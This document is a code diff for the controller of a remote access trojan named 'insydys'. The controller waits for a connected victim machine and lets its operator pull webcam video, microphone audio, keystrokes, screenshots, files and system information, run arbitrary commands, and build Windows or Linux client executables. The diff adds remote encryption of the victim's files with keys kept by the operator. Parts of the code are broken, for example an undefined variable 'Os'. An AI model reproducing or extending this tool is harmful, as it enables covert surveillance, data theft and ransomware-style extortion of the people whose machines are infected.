@@ -1,3 +1,4 @@
+#!/usr/bin/python3
 import os
 from pyfiglet import Figlet
 import sys
@@ -10,6 +11,7 @@ import soundfile as sf
 import soundcard as sc
 import threading
 import subprocess
+import shutil
 def vidcap():
    global insydys
    global conn
@@ -27,13 +29,13 @@ def vidcap():
              print(" could not retrieve video footage")
           else:
              size=int(vid_inc)
-             print("Video file vidrec.avi is:",size)
+             print("Video file vidrec.mp4 is:",size)
              response=input("Retrieve(y/n)?")
              if response[:1]=="y":
                 conn.send(response.encode())
                 vid_data=conn.recv(size)
                 vid_len=len(vid_data)
-                vid_file=open("vidrec.avi",'wb')
+                vid_file=open("vidrec.mp4",'wb')
                 vid_file.write(vid_data)
                 if vid_len==size:
                        vid_file.close()
@@ -45,41 +47,42 @@ def vidcap():
                 
                 vid_file.close()
                 
-                print("video footage received saved at"+os.getcwd()+"as:vidrec.avi")
+                print("video footage received saved at"+os.getcwd()+"as:vidrec.mp4")
                 playvid=input('Do u wish to play the video now(y/n): ')
                 try:
+                    
                      if playvid[:1]=='y':
-                            cap = cv2.VideoCapture('vidrec.avi') 
+                           
+                            cap = cv2.VideoCapture('vidrec.mp4') 
                                
-                          
+                            
                             if (cap.isOpened()== False):  
                               print("Error opening video  file") 
                                
-                       
+                           
                             while(cap.isOpened()): 
                                   
-                      
+                              
                               ret, frame = cap.read() 
                               if ret == True: 
                                
-                              
+                                 
                                 cv2.imshow('Frame', frame) 
                                
-                               
+                                
                                 if cv2.waitKey(100) & 0xFF == ord('q'):
                                     break
                               else:
-                                 break
+                                 cap.release() 
                                    
-                              
-                         
+                                
+                                 cv2.destroyAllWindows()
+
                             cap.release() 
                                    
-                               
                             cv2.destroyAllWindows()
                             
-                            
-                            
+                        
                      elif playvid[:1]=='n':
                          print("Exiting video screen")
 
@@ -93,7 +96,24 @@ def vidcap():
                   
    except:
           print('could not acquire video footage')
-           
+
+          
+def crypto():
+   global conn
+   global filename
+   global Key
+   filename=input("File name:")
+   while filename=="":
+      filename=input("File name:")
+   conn.send(filename.encode())
+   Key=input("Key:")
+   while Key=="":
+      Key=input("Key:")
+   conn.send(Key.encode())
+   Status=conn.recv(4000)
+   print(Status.decode())
+
+   
 def audcap():
    global insydys
    global conn
@@ -101,7 +121,6 @@ def audcap():
    recordtime=input('Enter duration of audio capture(all values taken in seconds)==> ')
    while recordtime=="":
           recordtime=input('Enter duration of audio capture(all values taken in seconds)==> ')
-          
    conn.send(recordtime.encode())
    print('Retrieving audio footage...')
    try:
@@ -143,7 +162,7 @@ def audcap():
                               print("releasing speakers")
                                
                 except:
-                       print('error:could not play  audio!')
+                       print('error:could not play video footage!')
              else:
                 conn.send(response.encode())
                 print("Erasing audio recording on client machine...")
@@ -187,6 +206,7 @@ def grab():
                              full_data+=len(file_data)
                              file.write(file_data)
                file.close()
+               shutil.unpack_archive(filename+'.zip',filename,"zip")
                print("File received")
             else:
                conn.send(response.encode())
@@ -271,6 +291,8 @@ def screenshot():
               
     except:
           print('could not acquire screenshot')
+
+          
 def Generate_exe():
    global host
    global port
@@ -278,6 +300,8 @@ def Generate_exe():
    ports=str(port)
    print("****EXE GENERATION STAGE****")
    OS=input("Generate executable for(Windows/Linux)?")
+   while Os=="":
+      OS=input("Generate executable for(Windows/Linux)?")
    if OS[:7]=="Windows" or OS[:7]=="windows":
       global windows_file
       windows_file=input("Enter file name for executable:")
@@ -328,6 +352,7 @@ def windows_compiler():
    file = open("insydyscli.py", "w")
    file.write(text.replace(ports,'0000'))
    file.close()
+   
 def linux_compiler():
    global linux_file
    global host
@@ -391,7 +416,11 @@ def upload():
       conn.send(Hostfail.encode())
        
 
-
+   '''else:
+          F='failed file not found'
+          s.send(F)
+          print(F)
+           '''
 def cd():
    global insydys
    global conn
@@ -420,6 +449,8 @@ def keylog():
    global conn
    insydys= insydys.encode()
    conn.send( insydys)
+
+   print('retrieving keystrokes...')
    try:
          keysize=conn.recv(1024)
          sized=keysize.decode()
@@ -448,7 +479,7 @@ def keylog():
             print("keylogs saved at"+os.getcwd()+"as:keylog.txt")
                    
    except:
-         print("could not acquire victim keystrokes")
+         print("could not acquire target keystrokes")
 
 
    
@@ -466,116 +497,150 @@ def sysinfo():
                   
                    
     except:
-           print("could not acquire victim system information")
+           print("could not acquire target system information")
 def server():
    global host
    global port
+   host=input("Enter connection I.P address:")
+   while host=="":
+      host=input("Enter connection I.P address:")
+   port=int(input("Enter connection port:"))
+   while port=="":
+      port=int(input("Enter connection port:"))
    print("******Server initialisation stage******")
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-   s.bind((host,port))
-   print('[=]server binded successfully')
-   s.listen(1)
-   print("[=]server running and listening to incoming connnections")
-   global conn
-   conn,addr=s.accept()
-   print("[=]server connected to",addr)
-   print("****options****","\n","vidcap->get video footage of webcams recording","\n",
-                    "audcap->get audio recording from victim machine microphone","\n",
-                    "keylog->get keystrokes captured","\n","grab->acquire files and folders from victim machine","\n",
-                    "upload->uploads file to victim machine","\n","screenshot->get a screenshot of victim machine","\n",
-                    "sysinfo->acquire victim machine system information","\n",
-                    "help->displays this information")
+   try:
+      s.bind((host,port))
+      print('[=]server binded successfully')
+      s.listen(1)
+      print("[=]server running and listening to incoming connnections")
+      global conn
+      conn,addr=s.accept()
+      print("[=]server connected to",addr)
+      print("****options****","\n","vidcap->get video footage of webcams recording","\n",
+                       "audcap->get audio recording from target machine microphone","\n",
+                       "keylog->get keystrokes captured","\n","grab->acquire files and folders from target machine","\n",
+                       "upload->uploads file to target machine","\n","screenshot->get a screenshot of target machine","\n",
+                       "sysinfo->acquire target machine system information","\n","key->Display saved keys for encrypted files","\n",
+                       "encrypt->encrypt files/folders","\n","decrypt->decrypt files/folders","\n",
+                       "help->displays this information")
+   except:
+      print("Error:Failed to setup server please check the given ip address or port")
+      s.close()
+      sys.exit()
+      
    
    while 1:
        while True:
-           global insydys
-           insydys=input(str('insydys>: '))
-           while insydys=="":
-               insydys=input(str('insydys>: '))
-           if insydys=="close":
-               conn.send(insydys.encode())
-               s.close()
-               conn.close()
-               sys.exit()
-           elif insydys[:7]=="sysinfo":
-               sysinfo()
-               break
-           elif insydys[:2]=="cd":
-               cd()
-               break
-           elif insydys[:4]=="grab":
-               grab()
-               break
-           elif insydys[:6]=="vidcap":
-               vidcap()
-               break
-           elif insydys[:6]=="keylog":
-               keylog()
-               break
-           elif insydys[:6]=="audcap":
-               audcap()
-               break
-           elif insydys[:10]=="screenshot":
-               screenshot()
-               break
-           elif insydys[:7]=="options":
-               print("****options****","\n","vidcap->get video footage of webcams recording","\n",
-                    "audcap->get audio recording from victim machine microphone","\n",
-                    "keylog->get keystrokes captured","\n","grab->acquire files and folders from victim machine","\n",
-                    "upload->uploads file to victim machine","\n","screenshot->get a screenshot of victim machine","\n",
-                    "sysinfo->acquire victim machine system information","\n",
-                    "help->displays this information")
+          try:
+              global insydys
+              insydys=input(str('insydys>: '))
+              while insydys=="":
+                  insydys=input(str('insydys>: '))
+              if insydys=="close":
+                  conn.send(insydys.encode())
+                  s.close()
+                  conn.close()
+                  sys.exit()
+              elif insydys[:7]=="sysinfo":
+                  sysinfo()
+                  break
+              elif insydys[:2]=="cd":
+                  cd()
+                  break
+              elif insydys[:4]=="grab":
+                  grab()
+                  break
+              elif insydys[:6]=="vidcap":
+                  vidcap()
+                  break
+              elif insydys[:6]=="keylog":
+                  keylog()
+                  break
+              elif insydys[:6]=="audcap":
+                  audcap()
+                  break
+              elif insydys[:10]=="screenshot":
+                  screenshot()
+                  break
+              elif insydys[:7]=="decrypt":
+                   conn.send(insydys.encode())
+                   crypto()
+                   break
+              elif insydys[:4]=="keys":
+                   kf=open("Keys.txt","r")
+                   fk=kf.read()
+                   print(fk)
+                   break
+              elif insydys[:7]=="encrypt":
+                   global filename
+                   global Key
+                   conn.send(insydys.encode())
+                   crypto()
+                   kf=open("Keys.txt","a+")
+                   kf.write(Key+"="+filename+"\n")
+                   break
+              elif insydys[:7]=="options":
+                  print("****options****","\n","vidcap->get video footage of webcams recording","\n",
+                       "audcap->get audio recording from target machine microphone","\n",
+                       "keylog->get keystrokes captured","\n","grab->acquire files and folders from target machine","\n",
+                       "upload->uploads file to target machine","\n","screenshot->get a screenshot of target machine","\n",
+                       "sysinfo->acquire target machine system information","\n",
+                        "key->Display saved keys for encrypted files","\n",
+                        "encrypt->encrypt files/folders","\n","decrypt->decrypt files/folders","\n"
+                       "help->displays this information")
 
-               break
-           elif insydys[:4]=="help":
-               print("****options****","\n","vidcap->get video footage of webcams recording","\n",
-                    "audcap->get audio recording from victim machine microphone","\n",
-                    "keylog->get keystrokes captured","\n","grab->acquire files and folders from victim machine","\n",
-                    "upload->uploads file to victim machine","\n","screenshot->get a screenshot of victim machine","\n",
-                    "sysinfo->acquire victim machine system information","\n",
-                    "help->displays this information")
+                  break
+              elif insydys[:4]=="help":
+                  print("****options****","\n","vidcap->get video footage of webcams recording","\n",
+                       "audcap->get audio recording from target machine microphone","\n",
+                       "keylog->get keystrokes captured","\n","grab->acquire files and folders from target machine","\n",
+                       "upload->uploads file to target machine","\n","screenshot->get a screenshot of target machine","\n",
+                       "sysinfo->acquire target machine system information","\n","key->Display saved keys for encrypted files","\n",
+                        "encrypt->encrypt files/folders","\n","decrypt->decrypt files/folders","\n",
+                       "help->displays this information")
 
-               break
-           elif insydys[:6]=="upload":
-               upload()
-               break
-           
-           else:
-                insydys= insydys.encode()
-                conn.send( insydys)
-                try:
-                       
-                       size_d=conn.recv(1024)
-                       sized=size_d.decode()
-                       if sized.startswith('unknown'):
-                              print("error while handling command/command has no static output")
-                              
-                       else :
-                              print(sized)
-                              act_size=int(sized)
-                              print(act_size)
-                              output=conn.recv(act_size)
-                              file=open('_.txt','wb') 
-                              full_data=len(output)
-                              file.write(output)
-                                                                  
-                              if full_data==act_size:
-                                     file.close()
-                              else:
-                                     while full_data<act_size:
-                                            output=conn.recv(1024)
-                                            full_data+=len(output)
-                                            file.write(output)
-                              file.close()
-                              com_out=open('_.txt','r')
-                              contents=com_out.read()
-                              com_out.close()
-                              print(contents)
-                             
-                except:
-                       print("Value error data  received was invalid")
-
-
+                  break
+              elif insydys[:6]=="upload":
+                  upload()
+                  break
+              
+              else:
+                   insydys= insydys.encode()
+                   conn.send( insydys)
+                   try:
+                          
+                          size_d=conn.recv(1024)
+                          sized=size_d.decode()
+                          if sized.startswith('unknown'):
+                                 print("error while handling command/command has no static output")
+                                 
+                          else :
+                                 print(sized)
+                                 act_size=int(sized)
+                                 print(act_size)
+                                 output=conn.recv(act_size)
+                                 file=open('_.txt','wb') 
+                                 full_data=len(output)
+                                 file.write(output)
+                                                                     
+                                 if full_data==act_size:
+                                        file.close()
+                                 else:
+                                        while full_data<act_size:
+                                               output=conn.recv(1024)
+                                               full_data+=len(output)
+                                               file.write(output)
+                                 file.close()
+                                 com_out=open('_.txt','r')
+                                 contents=com_out.read()
+                                 com_out.close()
+                                 print(contents)
+                                
+                   except:
+                          print("Value error: failed to process data received")
+          except:
+              print("command initiated encountered errors")
    
 def main():
    custom_fig = Figlet(font='graffiti')
@@ -585,12 +650,12 @@ def main():
    start_server=input("(1)Start insydys session with entered host and port"
                       +"\n"+"(2)Generate executable file and quit"+"\n"+
                       "(3)Generate executable and start insydys session"+"\n"+":")
-   host=input("Enter connection I.P address:")
+   '''host=input("Enter connection I.P address:")
    while host=="":
       host=input("Enter connection I.P address:")
    port=int(input("Enter connection port:"))
    while port=="":
-      port=int(input("Enter connection port:"))
+      port=int(input("Enter connection port:"))'''
    if start_server[:1]=="1":
       server()
    elif start_server[:1]=="2":
@@ -600,7 +665,7 @@ def main():
       server()
    else:
       print("No selection made exiting")
-      sys.exit()
+      sys.exit
 if __name__=="__main__":
        main()           
         
